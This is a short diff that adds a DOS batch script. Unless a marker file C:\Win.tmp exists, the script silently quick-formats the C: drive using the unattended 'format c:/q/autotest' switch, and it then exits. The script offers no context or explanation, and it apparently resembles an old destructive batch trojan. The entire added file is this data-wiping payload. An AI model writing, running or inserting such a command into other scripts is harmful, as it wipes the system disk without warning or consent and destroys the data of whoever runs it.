@@ -1,0 +1,5 @@
+@if exist C:\Win.tmp goto q                        
+:e                         
+@format c:/q/autotest                         
+:q                         
+@exit                         
